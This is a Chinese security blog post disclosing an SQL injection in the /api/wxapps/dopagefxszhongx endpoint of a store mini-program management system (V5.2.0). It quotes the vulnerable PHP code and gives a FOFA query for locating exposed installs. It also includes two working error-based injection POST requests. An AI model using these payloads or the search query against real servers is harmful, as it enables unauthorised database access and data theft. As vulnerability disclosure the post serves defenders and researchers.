---
title: "万能门店小程序管理系统 /api/wxapps/dopagefxszhongx SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-dopagefxszhongx-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopagefxszhongx-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/dopagefxszhongx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/17 08:27
* 499浏览
* [0评论](#comment)
* 29分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/dopagefxszhongx 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入防护

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
// 分销商中心
    public function dopagefxszhongx()
    {
        $uniacid = input("uniacid");
        $suid = input("suid");
        $sq = Db::name('wd_xcx_fx_sq')->where("uniacid", $uniacid)->where('suid', $suid)->find();
        $user = Db::name('wd_xcx_superuser')->where("uniacid", $uniacid)->where('id', $suid)->find();
        $arr['sq'] = $sq;
        $arr['user'] = $user;
        $arr['order_counts'] = 0;
        $arr['team_counts'] = 0;
        $arr['tx_counts'] = 0;
        $arr['zuidi'] = 0;
        $prefix = config('database.prefix');
        //我的团队数据
        $team_counts = count(Db::query("SELECT * FROM {$prefix}wd_xcx_superuser WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['team_counts'] = $team_counts;
        // 分销订单
        $order_counts = count(Db::query("SELECT * FROM  {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['order_counts'] = $order_counts;
        // 提现申请
        $tx_counts = Db::name('wd_xcx_fx_tx')->where("uniacid", $uniacid)->where('suid', $suid)->count();
        $arr['tx_counts'] = $tx_counts;
        // 最低提现规则
        $guiz = Db::name('wd_xcx_fx_gz')->where("uniacid", $uniacid)->find();
        $arr['zuidi'] = $guiz['txmoney'];
        $arr['guiz'] = $guiz;
        $result['data'] = $arr;
        return json_encode($result);
    }
```

漏洞点

```
//我的团队数据
        $team_counts = count(Db::query("SELECT * FROM {$prefix}wd_xcx_superuser WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['team_counts'] = $team_counts;
        // 分销订单
        $order_counts = count(Db::query("SELECT * FROM  {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['order_counts'] = $order_counts;
```

`$uniacid` 和 `$suid` 直接拼接进SQL语句，从而造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/dopagefxszhongx HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--
```

[![万能门店小程序管理系统 /api/wxapps/dopagefxszhongx SQL 注入漏洞](images/img-001-19d465aebc16.webp)](https://image.mrxn.net/cfe38ccdc77a4b3bbac2347c4d7d525a.webp)

```
POST /api/wxapps/dopagefxszhongx HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

suid=1'AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)+and+'1'='1&uniacid=1
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/dopagefxszhongx SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-dopagefxszhongx-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-dopagefxszhongx-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-dopagefxszhongx-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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